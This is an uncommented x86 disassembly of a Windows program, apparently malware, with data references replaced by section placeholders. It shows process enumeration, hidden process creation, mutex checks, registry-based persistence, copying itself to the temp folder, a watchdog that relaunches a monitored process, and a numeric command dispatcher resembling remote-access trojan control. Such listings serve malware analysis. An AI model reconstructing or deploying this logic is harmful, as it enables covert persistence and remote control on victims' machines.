lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
xor al al
jmp r-xdata
test eax eax
je r-xdata
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov al bl
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp r-xdata
push [ ebp - 0x25c ]
call sub_411264
test al al
pop ecx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::assign@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
sub_408f3e
push ebp
mov ebp esp
push esi
push edi
push 0xa
push r--data
push 0x0
call [ FindResourceA@IAT ]
mov edi eax
push edi
push 0x0
call [ LoadResource@IAT ]
push eax
call [ LockResource@IAT ]
push edi
push 0x0
mov esi eax
call [ SizeofResource@IAT ]
mov ecx [ ebp + 0x8 ]
pop edi
mov [ ecx ] esi
pop esi
pop ebp
retn
sub_408f78
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push 0x3
push eax
push 0x5a
push 0x800
call [ GetLocaleInfoA@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_408fa5
push ebp
mov ebp esp
sub esp 0x320
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
call sub_41123a
push 0x0
push 0x2
mov [ rw-data ] al
call CreateToolhelp32Snapshot
mov edi eax
test edi edi
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
leave
retn
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x320 ] 0x22c
push eax
push edi
call Process32FirstW
lea eax [ ebp - 0x320 ]
push eax
push edi
call Process32NextW
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
push esi
mov esi r--data
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2fc ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
push [ ebp - 0x318 ]
call sub_411264
movzx eax al
push eax
lea eax [ ebp - 0xe4 ]
push eax
call sub_410e67
add esp 0xc
push eax
push esi
push [ ebp - 0x318 ]
lea eax [ ebp - 0xc4 ]
push eax
call sub_410e67
pop ecx
pop ecx
push eax
push esi
push [ ebp - 0x318 ]
lea eax [ ebp - 0xa4 ]
push eax
call sub_4112ef
push eax
lea eax [ ebp - 0x84 ]
push eax
call sub_410fa4
add esp 0x10
push eax
lea eax [ ebp - 0x24 ]
push esi
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_410fa4
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0x14
push eax
lea eax [ ebp - 0xd4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xf4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0xb4 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x94 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x94 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xb4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xf4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xd4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x84 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xa4 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0xc4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0xe4 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x320 ]
push eax
push edi
call Process32NextW
test eax eax
jne r-xdata
pop esi
sub_4091dc
push ebp
mov ebp esp
sub esp 0x54
push esi
push edi
push 0x11
xor eax eax
pop ecx
lea edi [ ebp - 0x54 ]
[ edi ]
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x54 ] 0x44
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
xor eax eax
push eax
push eax
push 0x8000000
push eax
push eax
push eax
push r--data
push r--data
call [ CreateProcessA@IAT ]
push [ ebp - 0x10 ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0xc ]
call esi
pop edi
pop esi
leave
retn
sub_409234
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov ecx edi
call sub_4012b5
mov ecx esi
mov ebx eax
call sub_4012b5
cmp ebx eax
ja r-xdata
mov ecx edi
call sub_4012b5
mov ecx esi
mov ebx eax
call sub_409344
cmp ebx eax
ja r-xdata
push [ esi + 0x4 ]
mov ecx edi
call sub_411d79
push eax
mov ecx edi
call sub_409357
push eax
call sub_409387
add esp 0xc
mov ecx esi
push [ esi + 0x8 ]
push eax
call sub_401b07
push [ esi + 0x8 ]
mov ecx esi
push [ esi + 0x4 ]
call sub_401b07
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0xc ]
sub ecx eax
sar ecx 0x4
push ecx
push eax
mov ecx esi
call sub_401b64
push 0x0
mov ecx edi
call sub_4012b5
push eax
mov ecx esi
call sub_401b51
push eax
mov ecx edi
mov [ esi + 0x4 ] eax
call sub_411d79
push eax
mov ecx edi
call sub_409357
push eax
mov ecx esi
call sub_40935b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov ecx esi
call sub_4012b5
mov ebx eax
mov ecx edi
shl ebx 0x4
call sub_409357
push [ esi + 0x4 ]
add ebx eax
mov ecx edi
push ebx
call sub_409357
push eax
call sub_409387
add esp 0xc
mov ecx edi
push [ esi + 0x8 ]
call sub_411d79
push eax
push ebx
mov ecx esi
call sub_40935b
jmp r-xdata
mov ecx edi
call sub_4012b5
shl eax 0x4
add eax [ esi + 0x4 ]
mov [ esi + 0x8 ] eax
jmp r-xdata
sub_40935b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov eax [ ebp + 0x10 ]
pop edi
pop esi
pop ebp
retn 0xc
push esi
mov ecx edi
push [ ebp + 0x10 ]
call sub_401b74
add [ ebp + 0x10 ] 0x10
add esi 0x10
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_409387
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
pop esi
pop ebp
retn
mov ecx [ ebp + 0x10 ]
push esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
add [ ebp + 0x10 ] 0x10
add esi 0x10
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_4093d9
push ebp
mov ebp esp
push ebx
mov ebx rw-data
push esi
push edi
mov ecx ebx
call sub_401fd3
sub esp 0x10
mov esi rw-data
mov edi esp
mov ecx ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_402032
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x75
sub esp 0x10
lea eax [ ebp + 0x8 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x76
jmp r-xdata
mov ecx ebx
call sub_402062
push 0x1
push sub_409450
mov ecx ebx
call sub_4020e9
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_409450
push ebp
mov ebp esp
sub esp 0x50
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x20 ]
lea eax [ esi + 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push [ esi + 0x28 ]
call [ SetEvent@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov edi [ eax ]
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x20 ]
push [ eax ]
lea eax [ ebp - 0x30 ]
push 0x4
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
sub esp 0x10
mov ebx rw-data
mov ecx esp
push ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x30 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call sub_41113a
add esp 0x24
sub edi 0x46
je r-xdata
push 0x1
lea ecx [ ebp - 0x10 ]
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_405cd4
xor edi edi
pop ecx
cmp eax edi
mov [ ebp + 0x8 ] eax
je r-xdata
dec edi
je r-xdata
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov edx esp
push r--data
push ebx
push edi
mov [ ebp + 0x8 ] edx
call sub_401289
push eax
lea eax [ ebp - 0x50 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
mov eax [ ebp + 0x8 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx esi
push 0x85
call sub_402062
lea ecx [ ebp - 0x50 ]
push r--data
push eax
call sub_405f2e
push r--data
mov [ rw-data ] eax
push [ ebp + 0x8 ]
call sub_405f2e
push r--data
mov [ rw-data ] eax
push [ ebp + 0x8 ]
call sub_405f2e
push r--data
mov [ rw-data ] eax
push [ ebp + 0x8 ]
call sub_405f2e
push r--data
mov [ rw-data ] eax
push [ ebp + 0x8 ]
call sub_405f2e
add esp 0x28
cmp [ rw-data ] edi
mov [ rw-data ] eax
je r-xdata
xor edi edi
push r--data
push edi
push edi
push edi
call [ CreateEventA@IAT ]
push edi
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
call [ rw-data ]
push ecx
push ecx
mov ecx esp
push eax
push ecx
call sub_410e67
pop ecx
pop ecx
push 0x77
mov ecx esi
call sub_402062
push 0xffffffff
push ebx
call [ WaitForSingleObject@IAT ]
push ebx
call [ CloseHandle@IAT ]
jmp r-xdata
dec edi
je r-xdata
sub esp 0x10
lea ecx [ ebp - 0x10 ]
mov edx esp
push r--data
push ebx
push edi
mov [ ebp + 0x8 ] edx
call sub_401289
push eax
lea eax [ ebp - 0x40 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
mov eax [ ebp + 0x8 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov ecx esi
push 0x85
call sub_402062
lea ecx [ ebp - 0x40 ]
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
lea ecx [ ebp - 0x10 ]
call sub_401ad8
lea ecx [ ebp - 0x30 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push [ rw-data ]
call inet_ntoa
push 0x0
lea ecx [ ebp - 0x10 ]
mov edi eax
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call [ atoi@IAT ]
push eax
push edi
call [ rw-data ]
push ecx
mov ecx esp
push eax
push ecx
call sub_410e67
pop ecx
pop ecx
push 0x78
jmp r-xdata
dec edi
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ rw-data ] edi
je r-xdata
mov ecx esi
call sub_402062
jmp r-xdata
call [ rw-data ]
sub esp 0x10
mov ecx esp
push eax
push ecx
call sub_410e67
pop ecx
pop ecx
push 0x77
jmp r-xdata
dec edi
jne r-xdata
cmp eax edi
je r-xdata
call [ rw-data ]
jmp r-xdata
push edi
lea ecx [ ebp - 0x10 ]
mov [ rw-data ] 0x1
call sub_401289
sub esp 0x10
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x76
sub_40970d
push ebp
mov ebp esp
sub esp 0x48
push esi
push edi
call [ GetCurrentProcessId@IAT ]
mov edi rw-data
push eax
push r--data
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi 0x80000001
push eax
push esi
call sub_40a6fe
add esp 0x10
test al al
jne r-xdata
push [ rw-data ]
push 0x0
push 0x100000
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
call sub_41123a
test al al
jne r-xdata
push ebx
push eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x8 ]
mov ebx r--data
push eax
push ebx
mov ecx edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_40a3e4
add esp 0x10
test al al
je r-xdata
pop edi
pop esi
leave
retn 0x4
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x28 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x1 ]
push eax
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x48 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x28 ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x48 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x2 ]
push eax
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x38 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x48 ]
jmp r-xdata
push 0x1
pop eax
pop ebx
jmp r-xdata
push [ ebp - 0x8 ]
push 0x0
push 0x1f0fff
call [ OpenProcess@IAT ]
push ebx
mov ecx edi
mov [ rw-data ] eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_40a7eb
push [ ebp - 0x8 ]
call sub_4098fe
push [ rw-data ]
call [ CloseHandle@IAT ]
push 0x3
pop esi
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax esi
push 0x7d0
call [ Sleep@IAT ]
push [ rw-data ]
call sub_4098fe
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
push rw-data
push 0x0
call [ GetModuleHandleA@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_40e5af
add esp 0xc
test al al
je r-xdata
sub_4098fe
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
push 0x0
push 0x100000
call [ OpenProcess@IAT ]
mov esi eax
push 0xffffffff
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
call sub_40970d
jmp r-xdata
sub_409936
push ebp
mov ebp esp
sub esp 0x838
push ebx
push esi
push edi
xor edi edi
push [ rw-data ]
push 0x1
push edi
call [ CreateMutexA@IAT ]
lea eax [ ebp - 0x838 ]
push 0x104
push eax
push edi
call [ GetModuleFileNameW@IAT ]
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x220 ]
push 0x208
mov ebx rw-data
push eax
push r--data
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi 0x80000001
push eax
push esi
call sub_40a5ae
add esp 0x1c
test al al
jne r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x18 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_41156a
pop ecx
test al al
pop ecx
jne r-xdata
push edi
call [ exit@IAT ]
push [ ebp + 0x8 ]
push edi
push 0x100000
call [ OpenProcess@IAT ]
push 0xffffffff
push eax
mov [ ebp - 0x8 ] eax
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
call [ GetCurrentProcessId@IAT ]
push eax
push r--data
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_40a6fe
add esp 0x10
test al al
je r-xdata
push edi
call [ exit@IAT ]
push 0x1
call [ exit@IAT ]
lea eax [ ebp - 0x220 ]
push eax
call [ PathFileExistsW@IAT ]
test eax eax
jne r-xdata
push 0x1
push edi
lea eax [ ebp - 0x220 ]
push edi
push eax
push r--data
push edi
jmp r-xdata
lea eax [ ebp - 0x220 ]
push edi
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
test al al
je r-xdata
call [ ShellExecuteW@IAT ]
mov ecx 0x82
xor eax eax
lea edi [ ebp - 0x630 ]
[ edi ]
lea eax [ ebp - 0x630 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
lea eax [ ebp - 0x428 ]
push eax
push 0x0
lea eax [ ebp - 0x630 ]
push r--data
push eax
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x428 ]
push r--data
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x428 ]
push 0x0
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp - 0x18 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
test al al
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
push edi
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_40a7eb
add esp 0xc
jmp r-xdata
lea eax [ ebp + 0x8 ]
mov edi r--data
push eax
push edi
mov ecx ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call sub_40a3e4
add esp 0x10
mov [ ebp - 0x1 ] al
test al al
je r-xdata
xor eax eax
push 0x1
push eax
lea ecx [ ebp - 0x428 ]
push eax
push ecx
push r--data
push eax
xor edi edi
jmp r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_409b60
push ebp
mov ebp esp
sub esp 0x208
push ebx
mov ebx [ std::operator==@IAT ]
push esi
push edi
push r--data
push rw-data
call ebx
pop ecx
mov esi rw-data
test al al
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x208 ] 0x0
mov ecx 0x81
xor eax eax
lea edi [ ebp - 0x206 ]
[ edi ]
mov ecx esi
stosw [ edi ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0x208 ]
push 0x410
push eax
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a5ae
add esp 0x1c
test al al
je r-xdata
xor eax eax
mov edi rw-data
push r--data
push rw-data
call ebx
pop ecx
test al al
pop ecx
je r-xdata
lea eax [ ebp - 0x208 ]
mov ecx rw-data
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
push 0x3
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov ecx edi
